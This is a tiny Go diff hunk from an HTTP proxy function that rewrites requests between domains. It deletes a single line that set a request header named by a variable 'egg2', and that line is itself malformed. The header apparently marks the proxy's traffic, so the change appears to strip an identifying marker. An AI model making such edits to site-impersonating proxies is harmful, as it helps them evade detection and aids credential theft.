@@ -402,7 +402,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				req.Header.Set(egg2)
+				
 
 				// patch GET query params with original domains
 				if pl != nil {
